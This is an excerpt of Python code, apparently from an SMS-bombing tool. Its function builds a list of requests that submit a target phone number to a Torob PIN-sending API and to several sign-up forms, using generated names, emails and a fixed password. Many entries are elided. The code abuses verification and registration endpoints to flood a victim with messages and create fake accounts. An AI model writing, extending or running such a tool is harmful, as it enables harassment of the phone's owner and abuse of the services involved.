...
def urls(number):
    return [
        ...
        },
        {
            ...
            'method': 'get',
            'url': 'https://api.torob.com/v4/user/phone/send-pin/?phone_number=' + number
        },
        {
        ...
        },
        {
            ...
            'params': {"callback": "submitCallback", "name": username(), "phone": "+" + number, "email": email(), "gorod": "Москва", "approving_": "1"}
        },
        {
        ...
        },
        {
            ...
            'data': {"phone": "+"+number, "login": email(), "password": 'password', "agreement": "on", "oferta": "on"}
        },
        {
